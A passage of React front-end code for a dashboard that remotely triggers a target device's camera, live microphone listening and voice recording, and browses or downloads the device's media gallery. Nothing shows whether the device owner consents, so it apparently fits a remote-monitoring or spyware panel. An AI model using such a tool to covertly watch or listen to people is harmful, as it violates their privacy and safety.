                                            {/* Error */}
                                            {cameraError && (
                                                <div className="absolute bottom-2 left-2 right-2 bg-red-500/90 text-white text-xs p-2 rounded">⚠️ {cameraError}</div>
                                            )}
                                        </div>

                                        {/* Control Panel - Fullscreen shows only stop buttons */}
                                        <div className={`p-3 bg-black/60 ${isFullscreen ? 'flex justify-center' : ''}`}>
                                            {isFullscreen ? (
                                                /* Fullscreen: Only show stop button for active operation */
                                                <div className="flex gap-3">
                                                    {isLiveStreaming && (
                                                        <button
                                                            onClick={() => {
                                                                socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                                setIsLiveStreaming(false);
                                                                setLiveFrame(null);
                                                                setIsFullscreen(false);
                                                            }}
                                                            className="px-6 py-2 rounded-lg bg-red-600 text-white font-bold flex items-center gap-2"
                                                        >
                                                            ⏹ Stop Live
                                                        </button>
                                                    )}
                                                    {isRecording && (
                                                        <button
                                                            onClick={() => {
                                                                socket?.emit('stop_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                                setIsRecording(false);
                                                                setIsVideoUploading(true);
                                                                setIsFullscreen(false);
                                                            }}
                                                            className="px-6 py-2 rounded-lg bg-red-600 text-white font-bold flex items-center gap-2"
                                                        >
                                                            ⏹ Stop Recording
                                                        </button>
                                                    )}
                                                    {!isLiveStreaming && !isRecording && (
                                                        <button
                                                            onClick={() => setIsFullscreen(false)}
                                                            className="px-6 py-2 rounded-lg bg-white/20 text-white font-bold"
                                                        >
                                                            Exit Fullscreen
                                                        </button>
                                                    )}
                                                </div>
                                            ) : (
                                                /* Normal Mode: All controls */
                                                <div className="flex gap-2">
                                                    {/* GO LIVE */}
                                                    <button
                                                        onClick={() => {
                                                            if (!selectedDeviceId) return;
                                                            if (isLiveStreaming) {
                                                                socket?.emit('stop_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                                setIsLiveStreaming(false);
                                                                setLiveFrame(null);
                                                            } else {
                                                                socket?.emit('start_live_stream', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, quality: streamQuality });
                                                                setIsLiveStreaming(true);
                                                            }
                                                        }}
                                                        className={`flex-1 py-2 px-3 rounded-lg font-bold text-sm flex items-center justify-center gap-1.5 transition-all ${isLiveStreaming ? 'bg-red-600 text-white' : 'bg-cyan-600 text-white hover:bg-cyan-500'}`}
                                                        disabled={!selectedDeviceId || isRecording || isVideoUploading}
                                                    >
                                                        {isLiveStreaming ? '⏹ Stop' : '📹 Live'}
                                                    </button>

                                                    {/* SNAP */}
                                                    <button
                                                        onClick={() => {
                                                            if (!selectedDeviceId) return;
                                                            setIsCapturingPhoto(true);
                                                            socket?.emit('capture_photo', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode });
                                                        }}
                                                        className="flex-1 py-2 px-3 rounded-lg bg-green-600 text-white font-bold text-sm flex items-center justify-center gap-1.5 hover:bg-green-500"
                                                        disabled={!selectedDeviceId || isCapturingPhoto || isLiveStreaming}
                                                    >
                                                        {isCapturingPhoto ? <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : '📸'} Photo
                                                    </button>

                                                    {/* REC */}
                                                    {!isRecording ? (
                                                        <div className="flex-1 flex flex-col gap-1">
                                                            <div className="flex gap-0.5 justify-center">
                                                                {[{ label: '1m', value: 60 }, { label: '2m', value: 120 }, { label: '5m', value: 300 }].map((opt) => (
                                                                    <button
                                                                        key={opt.value}
                                                                        onClick={() => setRecordingDuration(opt.value)}
                                                                        className={`px-1.5 py-0.5 rounded text-xs font-bold ${recordingDuration === opt.value ? 'bg-orange-500 text-white' : 'bg-white/10 text-white/50'}`}
                                                                    >
                                                                        {opt.label}
                                                                    </button>
                                                                ))}
                                                            </div>
                                                            <button
                                                                onClick={() => {
                                                                    if (!selectedDeviceId) return;
                                                                    socket?.emit('start_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId, camera: cameraMode, duration: recordingDuration });
                                                                    setIsRecording(true);
                                                                    setRecordingProgress({ current: 0, total: recordingDuration });
                                                                }}
                                                                className="py-2 px-3 rounded-lg bg-orange-600 text-white font-bold text-sm flex items-center justify-center gap-1.5 hover:bg-orange-500"
                                                                disabled={!selectedDeviceId || isLiveStreaming || isVideoUploading}
                                                            >
                                                                🎬 Rec
                                                            </button>
                                                        </div>
                                                    ) : (
                                                        <button
                                                            onClick={() => {
                                                                socket?.emit('stop_recording', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
                                                                setIsRecording(false);
                                                                setIsVideoUploading(true);
                                                            }}
                                                            className="flex-1 py-2 px-3 rounded-lg bg-red-600 text-white font-bold text-sm animate-pulse"
                                                        >
                                                            ⏹ Stop ({recordingProgress.current}s)
                                                        </button>
                                                    )}
                                                </div>
                                            )}
                                        </div>
                                    </div>
                                    </div>

                                    {/* Captured Media Gallery */}
                                    {capturedMedia.length > 0 && (
                                        <div className="bg-white/5 border border-white/10 p-3 rounded-xl">
                                            <div className="flex justify-between items-center mb-3">
                                                <span className="text-sm text-white/60 font-mono">{capturedMedia.length} Captures</span>
                                                <button onClick={() => setCapturedMedia([])} className="text-xs text-white/40 hover:text-white">Clear</button>
                                            </div>
                                            <div className="grid grid-cols-3 sm:grid-cols-4 lg:grid-cols-5 gap-2">
                                                {capturedMedia.map((media, i) => {
                                                    const isUrl = media.data.startsWith('/') || media.data.startsWith('http');
                                                    const src = isUrl
                                                        ? (media.data.startsWith('http') ? media.data : `https://p01--gallery-eye--9zr85m7yb6s4.code.run${media.data}`)
                                                        : media.type === 'video' ? `data:video/mp4;base64,${media.data}` : `data:image/jpeg;base64,${media.data}`;

                                                    return (
                                                        <div
                                                            key={i}
                                                            onClick={() => setPreviewCapture({ type: media.type, data: src })}
                                                            className="group relative aspect-square bg-black rounded-lg overflow-hidden border border-white/10 cursor-pointer hover:border-white/30"
                                                        >
                                                            {media.type === 'photo' ? (
                                                                <img src={src} className="w-full h-full object-cover" alt="" />
                                                            ) : (
                                                                <div className="relative w-full h-full">
                                                                    <video src={src} className="w-full h-full object-cover" />
                                                                    <div className="absolute inset-0 flex items-center justify-center bg-black/40">
                                                                        <span className="text-white text-lg">▶</span>
                                                                    </div>
                                                                </div>
                                                            )}
                                                            <div className="absolute bottom-0 left-0 right-0 bg-black/60 px-1 py-0.5 text-[10px] text-white/60 text-center">
                                                                {new Date(media.timestamp).toLocaleTimeString()}
                                                            </div>
                                                        </div>
                                                    );
                                                })}
                                            </div>
                                        </div>
                                    )}

                                    {/* Preview Modal */}
                                    {previewCapture && (
                                        <div
                                            className="fixed inset-0 z-50 bg-black/90 flex items-center justify-center p-4"
                                            onClick={() => setPreviewCapture(null)}
                                        >
                                            <button className="absolute top-4 right-4 text-white p-2 hover:bg-white/10 rounded-full">
                                                <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                            </button>
                                            {previewCapture.type === 'photo' ? (
                                                <img src={previewCapture.data} className="max-w-full max-h-[90vh] object-contain rounded-lg" alt="Preview" />
                                            ) : (
                                                <video src={previewCapture.data} controls autoPlay className="max-w-full max-h-[90vh] rounded-lg" />
                                            )}
                                        </div>
                                    )}
                                </div>
                            )}
                        </>
                    )}

                    {/* Live Audio Tool */}
                    {selectedTool === 'audio' && (
                        <div className="space-y-4">
                            <div className="bezel overflow-hidden">
                                <div className="bezel-inner bg-[#0a0a0f] flex flex-col">
                                {/* Header */}
                                <div className="px-4 py-3 border-b border-white/10 flex items-center justify-between bg-black/40">
                                    <div className="flex items-center gap-2">
                                        <div className={`w-2.5 h-2.5 rounded-full ${isLiveAudio ? 'bg-emerald-500 animate-pulse' : 'bg-white/20'}`} />
                                        <span className="text-sm font-mono text-white/70">
                                            {isLiveAudio ? `LIVE • ${formatTime(audioElapsed)}` : 'READY'}
                                        </span>
                                    </div>
                                    {isLiveAudio && (
                                        <span className="text-xs text-emerald-400/70 font-mono">PCM 16kHz</span>
                                    )}
                                </div>

                                {/* Visualizer Area */}
                                <div className="relative bg-black aspect-[2.5/1] flex items-center justify-center overflow-hidden">
                                    {isLiveAudio ? (
                                        <>
                                            <canvas
                                                ref={audioCanvasRef}
                                                width={512}
                                                height={200}
                                                className="w-full h-full"
                                            />
                                            {/* VU Meter Overlay */}
                                            <div className="absolute bottom-2 left-2 right-2 h-1.5 bg-white/10 rounded-full overflow-hidden">
                                                <div
                                                    className="h-full rounded-full transition-all duration-100"
                                                    style={{
                                                        width: `${audioLevel * 100}%`,
                                                        background: audioLevel > 0.8 ? '#ef4444' : audioLevel > 0.5 ? '#f59e0b' : '#10b981'
                                                    }}
                                                />
                                            </div>
                                        </>
                                    ) : (
                                        /* Idle State */
                                        <div className="text-center">
                                            <div className="relative w-20 h-20 mx-auto mb-3">
                                                <div className="absolute inset-0 border-2 border-emerald-500/20 rounded-full animate-ping" style={{ animationDuration: '2s' }} />
                                                <div className="absolute inset-0 border-2 border-emerald-500/10 rounded-full flex items-center justify-center">
                                                    <svg className="w-10 h-10 text-emerald-500/30" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" />
                                                    </svg>
                                                </div>
                                            </div>
                                            <p className="text-white/30 text-xs">Tap Start to begin listening</p>
                                        </div>
                                    )}
                                </div>

                                {/* Volume Control */}
                                <div className="px-4 py-3 bg-black/40 border-t border-white/10">
                                    <div className="flex items-center gap-3">
                                        {/* Mute Button */}
                                        <button
                                            onClick={() => setIsMuted(!isMuted)}
                                            className={`p-1.5 rounded-lg transition-colors ${isMuted ? 'bg-red-500/20 text-red-400' : 'bg-white/10 text-white/60 hover:text-white'}`}
                                        >
                                            {isMuted ? (
                                                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2" /></svg>
                                            ) : (
                                                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15.536 8.464a5 5 0 010 7.072m2.828-9.9a9 9 0 010 12.728M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z" /></svg>
                                            )}
                                        </button>

                                        {/* Volume Slider */}
                                        <input
                                            type="range"
                                            min="0"
                                            max="100"
                                            value={isMuted ? 0 : audioVolume}
                                            onChange={(e) => {
                                                setAudioVolume(Number(e.target.value));
                                                if (Number(e.target.value) > 0) setIsMuted(false);
                                            }}
                                            className="flex-1 h-1.5 bg-white/10 rounded-full appearance-none cursor-pointer accent-emerald-500"
                                        />

                                        {/* Volume % */}
                                        <span className="text-xs text-white/40 font-mono w-8 text-right">
                                            {isMuted ? '0' : audioVolume}%
                                        </span>
                                    </div>
                                </div>

                                {/* Control Panel */}
                                <div className="p-3 bg-black/60">
                                    <div className="flex gap-2">
                                        <button
                                            onClick={() => isLiveAudio ? stopLiveAudio() : startLiveAudio()}
                                            className={`flex-1 py-3 px-4 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all ${
                                                isLiveAudio
                                                    ? 'bg-red-600 text-white hover:bg-red-500'
                                                    : 'bg-gradient-to-r from-emerald-600 to-teal-600 text-white hover:from-emerald-500 hover:to-teal-500'
                                            }`}
                                            disabled={!selectedDeviceId}
                                        >
                                            {isLiveAudio ? (
                                                <>
                                                    <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2" /></svg>
                                                    Stop Listening
                                                </>
                                            ) : (
                                                <>
                                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" /></svg>
                                                    Start Listening
                                                </>
                                            )}
                                        </button>
                                    </div>
                                </div>
                            </div>
                            </div>

                            {/* Error Display */}
                            {audioError && (
                                <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-3 flex items-center gap-2">
                                    <svg className="w-4 h-4 text-red-400 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" /></svg>
                                    <span className="text-sm text-red-300">{audioError}</span>
                                </div>
                            )}

                            {/* Info Card */}
                            <div className="bg-emerald-500/5 border border-emerald-500/20 rounded-xl p-4">
                                <div className="flex items-start gap-3">
                                    <div className="p-2 rounded-lg bg-emerald-500/10 flex-shrink-0">
                                        <svg className="w-5 h-5 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
                                    </div>
                                    <div>
                                        <h4 className="text-sm font-medium text-emerald-300 mb-1">Live Audio</h4>
                                        <p className="text-xs text-white/40 leading-relaxed">
                                            Captures device microphone audio in real-time. Audio is streamed via encrypted WebSocket with noise suppression and auto gain control enabled for crystal clear listening.
                                        </p>
                                    </div>
                                </div>
                            </div>

                            {/* Voice Recording Section */}
                            <div className="bg-gray-900 border border-white/10 rounded-xl overflow-hidden">
                                {/* Header */}
                                <div className="px-4 py-3 border-b border-white/10 flex items-center justify-between bg-black/40">
                                    <div className="flex items-center gap-2">
                                        <div className={`w-2.5 h-2.5 rounded-full ${isVoiceRecording ? 'bg-red-500 animate-pulse' : 'bg-white/20'}`} />
                                        <span className="text-sm font-mono text-white/70">
                                            {isVoiceRecording ? `REC • ${formatTime(voiceRecProgress.current)}` : 'VOICE RECORDER'}
                                        </span>
                                    </div>
                                    {isVoiceRecording && (
                                        <span className="text-xs text-red-400/70 font-mono">{formatTime(voiceRecProgress.total - voiceRecProgress.current)} left</span>
                                    )}
                                </div>

                                {/* Duration Selector + Controls */}
                                <div className="p-4 space-y-3">
                                    {/* Duration Options */}
                                    {!isVoiceRecording && (
                                        <div className="flex gap-2">
                                            {[{ label: '1 Min', value: 60 }, { label: '5 Min', value: 300 }, { label: '10 Min', value: 600 }].map(opt => (
                                                <button
                                                    key={opt.value}
                                                    onClick={() => setVoiceRecDuration(opt.value)}
                                                    className={`flex-1 py-2 rounded-lg text-sm font-bold transition-all ${
                                                        voiceRecDuration === opt.value
                                                            ? 'bg-red-500 text-white shadow-lg shadow-red-500/20'
                                                            : 'bg-white/10 text-white/50 hover:bg-white/15 hover:text-white/70'
                                                    }`}
                                                >
                                                    {opt.label}
                                                </button>
                                            ))}
                                        </div>
                                    )}

                                    {/* Progress Bar */}
                                    {isVoiceRecording && (
                                        <div className="space-y-2">
                                            <div className="h-2 bg-white/10 rounded-full overflow-hidden">
                                                <div
                                                    className="h-full bg-red-500 rounded-full transition-all duration-1000"
                                                    style={{ width: `${(voiceRecProgress.current / voiceRecProgress.total) * 100}%` }}
                                                />
                                            </div>
                                            <div className="flex justify-between text-xs text-white/40 font-mono">
                                                <span>{formatTime(voiceRecProgress.current)}</span>
                                                <span>{formatTime(voiceRecProgress.total)}</span>
                                            </div>
                                        </div>
                                    )}

                                    {/* Start/Stop Button */}
                                    <button
                                        onClick={() => isVoiceRecording ? stopVoiceRecording() : startVoiceRecording()}
                                        className={`w-full py-3 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all ${
                                            isVoiceRecording
                                                ? 'bg-red-600 text-white hover:bg-red-500'
                                                : 'bg-gradient-to-r from-red-600 to-orange-600 text-white hover:from-red-500 hover:to-orange-500'
                                        }`}
                                        disabled={!selectedDeviceId}
                                    >
                                        {isVoiceRecording ? (
                                            <>
                                                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2" /></svg>
                                                Stop Recording
                                            </>
                                        ) : (
                                            <>
                                                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="6" /></svg>
                                                Record Voice
                                            </>
                                        )}
                                    </button>
                                </div>

                                {/* Recordings List */}
                                {voiceRecordings.length > 0 && (
                                    <div className="border-t border-white/10">
                                        <div className="px-4 py-2 bg-black/40">
                                            <span className="text-xs font-medium text-white/50">Recordings ({voiceRecordings.length})</span>
                                        </div>
                                        <div className="max-h-48 overflow-y-auto divide-y divide-white/5">
                                            {voiceRecordings.map((rec, idx) => (
                                                <div key={idx} className="px-4 py-2.5 flex items-center justify-between hover:bg-white/5">
                                                    <div className="flex items-center gap-3">
                                                        <button
                                                            onClick={() => setPlayingRecUrl(playingRecUrl === rec.url ? null : rec.url)}
                                                            className={`w-8 h-8 rounded-full flex items-center justify-center transition-all ${
                                                                playingRecUrl === rec.url ? 'bg-red-500 text-white' : 'bg-white/10 text-white/60 hover:bg-white/20'
                                                            }`}
                                                        >
                                                            {playingRecUrl === rec.url ? (
                                                                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="1" /></svg>
                                                            ) : (
                                                                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z" /></svg>
                                                            )}
                                                        </button>
                                                        <div>
                                                            <p className="text-sm text-white/80 font-medium">{formatTime(rec.duration)}</p>
                                                            <p className="text-xs text-white/30">{new Date(rec.timestamp).toLocaleTimeString()}</p>
                                                        </div>
                                                    </div>
                                                    <a href={rec.url} download className="p-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-white/40 hover:text-white/70 transition-colors">
                                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" /></svg>
                                                    </a>
                                                </div>
                                            ))}
                                        </div>
                                        {/* Audio Player */}
                                        {playingRecUrl && (
                                            <div className="px-4 py-2 border-t border-white/10 bg-black/40">
                                                <audio
                                                    src={playingRecUrl}
                                                    controls
                                                    autoPlay
                                                    onEnded={() => setPlayingRecUrl(null)}
                                                    className="w-full h-8"
                                                    style={{ filter: 'invert(1) hue-rotate(180deg)', opacity: 0.8 }}
                                                />
                                            </div>
                                        )}
                                    </div>
                                )}
                            </div>
                        </div>
                    )}
                </div>

                {selectedTool === 'gallery' && selectedDeviceId && (
                    <>
                        <div className="flex flex-col md:flex-row md:items-center justify-between mb-6 gap-4">
                            <h2 className="text-2xl font-bold">Your Gallery</h2>

                            {/* Apple-style Segmented Control */}
                            <div className="flex p-1 bg-black/40 backdrop-blur-xl rounded-full border border-white/10 self-start">
                                <button
                                    onClick={() => setActiveTab('all')}
                                    className={`px-5 py-2 rounded-full text-sm font-semibold transition-all duration-300 ${activeTab === 'all' ? 'bg-white text-black shadow-md scale-100' : 'text-white/60 hover:text-white hover:bg-white/5 scale-95'}`}
                                >
                                    All
                                </button>
                                <button
                                    onClick={() => setActiveTab('image')}
                                    className={`px-5 py-2 rounded-full text-sm font-semibold transition-all duration-300 ${activeTab === 'image' ? 'bg-white text-black shadow-md scale-100' : 'text-white/60 hover:text-white hover:bg-white/5 scale-95'}`}
                                >
                                    Images
                                </button>
                                <button
                                    onClick={() => setActiveTab('video')}
                                    className={`px-5 py-2 rounded-full text-sm font-semibold transition-all duration-300 ${activeTab === 'video' ? 'bg-white text-black shadow-md scale-100' : 'text-white/60 hover:text-white hover:bg-white/5 scale-95'}`}
                                >
                                    Videos
                                </button>
                                <button
                                    onClick={() => setActiveTab('zip')}
                                    className={`px-5 py-2 rounded-full text-sm font-semibold transition-all duration-300 flex items-center gap-1.5 ${activeTab === 'zip' ? 'bg-gradient-to-r from-purple-500 to-indigo-500 text-white shadow-[0_0_15px_rgba(91,94,244,0.4)] scale-100' : 'text-white/60 hover:text-white hover:bg-white/5 scale-95'}`}
                                >
                                    📦 ZIP
                                </button>
                            </div>
                        </div>

                        {/* Selection Toolbar (Dynamic Island Pill) */}
                        {isSelectionMode && (
                            <div className="fixed bottom-24 sm:bottom-8 left-1/2 -translate-x-1/2 z-[300] flex items-center gap-3 md:gap-4 p-2 rounded-[2rem] bg-[rgba(6,11,26,0.85)] backdrop-blur-2xl border border-white/10 shadow-[0_20px_40px_rgba(0,0,0,0.8),0_0_0_1px_rgba(255,255,255,0.05)] animate-slideUp w-max max-w-[95vw]">
                                <div className="flex items-center pl-3 md:pl-4 pr-1 md:pr-2 gap-2 md:gap-3">
                                    <span className="text-sm font-bold text-white whitespace-nowrap">{selectedItems.size}</span>
                                    <div className="h-5 w-[1px] bg-white/20" />
                                    <button onClick={selectAll} className="text-[11px] md:text-xs font-semibold text-white/50 hover:text-white transition-colors whitespace-nowrap px-2 py-1 rounded-full hover:bg-white/10 active:scale-95">
                                        {selectedItems.size === filteredImages.length ? 'Deselect All' : 'Select All'}
                                    </button>
                                </div>
                                
                                <div className="flex gap-2 pr-1">
                                    {/* Download Button */}
                                    <button
                                        onClick={downloadSelected}
                                        disabled={isDownloading}
                                        className="px-4 md:px-5 py-2.5 rounded-full bg-white text-black text-xs md:text-sm font-bold active:scale-95 transition-transform flex items-center justify-center gap-2 disabled:opacity-50"
                                    >
                                        {isDownloading ? (
                                            <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
                                        ) : (
                                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                                        )}
                                        <span className="hidden sm:inline">Download</span>
                                    </button>

                                    {/* Delete Button */}
                                    <button
                                        onClick={deleteSelected}
                                        disabled={isDeleting}
                                        className="px-4 md:px-5 py-2.5 rounded-full bg-red-500/10 text-red-500 border border-red-500/20 text-xs md:text-sm font-bold active:scale-95 transition-transform flex items-center justify-center gap-2 disabled:opacity-50"
                                    >
                                        {isDeleting ? (
                                            <div className="w-4 h-4 border-2 border-red-500/30 border-t-red-500 rounded-full animate-spin" />
                                        ) : (
                                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg>
                                        )}
                                        <span className="hidden sm:inline">Delete</span>
                                    </button>

                                    {/* Cancel Button */}
                                    <button onClick={() => { setSelectedItems(new Set()); setIsSelectionMode(false); }} className="w-10 h-10 rounded-full bg-white/5 hover:bg-white/10 text-white/50 hover:text-white transition-colors flex items-center justify-center active:scale-95">
                                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                    </button>
                                </div>
                            </div>
                        )}

                        {/* Content based on active tab */}
                        {activeTab === 'zip' ? (
                            /* ZIP Tab Content */
                            <div>
                                {zipFiles.length > 0 ? (
                                    <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
                                        {zipFiles.map((zip, idx) => (
                                            <a
                                                key={idx}
                                                href={zip.url}
                                                target="_blank"
                                                className="block p-4 rounded-2xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all group"
                                            >
                                                <div className="flex items-center gap-4">
                                                    <div className="w-14 h-14 rounded-xl bg-gradient-to-br from-purple-500/30 to-blue-500/30 flex items-center justify-center text-2xl group-hover:scale-110 transition-transform">
                                                        📦
                                                    </div>
                                                    <div className="flex-1">
                                                        <div className="font-semibold text-white group-hover:text-purple-400 transition-colors">{zip.folderName}.zip</div>
                                                        <div className="text-xs text-white/50">{zip.fileCount} files • {new Date(zip.timestamp).toLocaleTimeString()}</div>
                                                    </div>
                                                    <svg className="w-5 h-5 text-white/30 group-hover:text-purple-400 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                                                    </svg>
                                                </div>
                                            </a>
                                        ))}
                                    </div>
                                ) : (
                                    <div className="flex flex-col items-center justify-center py-20 text-white/40">
                                        <div className="w-24 h-24 rounded-3xl bg-gradient-to-br from-purple-500/20 to-blue-500/20 flex items-center justify-center mb-6 text-5xl">
                                            📦
                                        </div>
                                        <p className="text-lg font-medium mb-2">No ZIP downloads yet</p>
                                        <p className="text-sm text-white/30 text-center max-w-sm">When you download folders as ZIP from your device, they will appear here for easy access</p>
                                    </div>
                                )}
                            </div>
                        ) : (
                            /* Images/Videos Grid */
                            <>
                                {filteredImages.length === 0 ? (
                                    <div className="flex flex-col items-center justify-center py-20 text-white/40">
                                        <div className="w-20 h-20 rounded-2xl bg-white/5 flex items-center justify-center mb-4">
                                            <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                                        </div>
                                        <p>No media found.</p>
                                    </div>
                                ) : (
                                    <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
                                        {filteredImages.map((img) => (
                                            <div
                                                key={img.id}
                                                className={`group relative aspect-square rounded-2xl overflow-hidden bg-white/5 border transition-all duration-300 ${selectedItems.has(img.id) ? 'border-purple-500 ring-2 ring-purple-500/50' : 'border-white/10 hover:border-white/30'}`}
                                            >
                                                {img.resource_type === 'video' ? (
                                                    <video src={img.url} className="w-full h-full object-cover" muted loop preload="metadata" />
                                                ) : (
                                                    <img src={img.url} alt="Gallery Image" loading="lazy" className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-110" />
                                                )}

                                                {/* Click Area for Preview - LOWEST z-index */}
                                                <div
                                                    className="absolute inset-0 cursor-pointer z-0"
                                                    onClick={() => setPreviewItem(img)}
                                                />

                                                {/* Video Play Icon - MIDDLE z-index */}
                                                {img.resource_type === 'video' && (
                                                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-16 h-16 rounded-full bg-black/50 backdrop-blur-md flex items-center justify-center pointer-events-none border-2 border-white/30 z-5">
                                                        <svg className="w-8 h-8 text-white ml-1" fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z" /></svg>
                                                    </div>
                                                )}

                                                {/* Selection Checkbox - HIGHEST z-index */}
                                                <div className="absolute top-3 right-3 z-20">
                                                    <button
                                                        onClick={(e) => {
                                                            e.stopPropagation();
                                                            e.preventDefault();
                                                            toggleSelection(img.id);
                                                        }}
                                                        className={`w-8 h-8 rounded-full border-2 flex items-center justify-center transition-all shadow-lg ${selectedItems.has(img.id) ? 'bg-purple-500 border-purple-500 scale-110' : 'bg-black/40 backdrop-blur-sm border-white/70 hover:border-white hover:bg-black/60 hover:scale-110'}`}
                                                    >
                                                        {selectedItems.has(img.id) && <svg className="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7"></path></svg>}
                                                    </button>
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                )}
                                {galleryHasMore && (
                                    <div ref={galleryLoaderRef} className="flex justify-center py-8">
                                        {isLoadingMore ? (
                                            <div className="w-8 h-8 border-2 border-purple-500 border-t-transparent rounded-full animate-spin" />
                                        ) : (
                                            <div className="h-8" />
                                        )}
                                    </div>
                                )}
                            </>
                        )}

                        {/* Preview Modal */}
                        {previewItem && (
                            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/95 backdrop-blur-xl animate-fadeIn">
                                <button
                                    onClick={() => setPreviewItem(null)}
                                    className="absolute top-6 right-6 p-2 rounded-full bg-white/10 hover:bg-white/20 transition-colors z-50"
                                >
                                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                </button>

                                <div className="relative w-full h-full max-w-6xl max-h-[90vh] p-4 flex flex-col items-center justify-center">
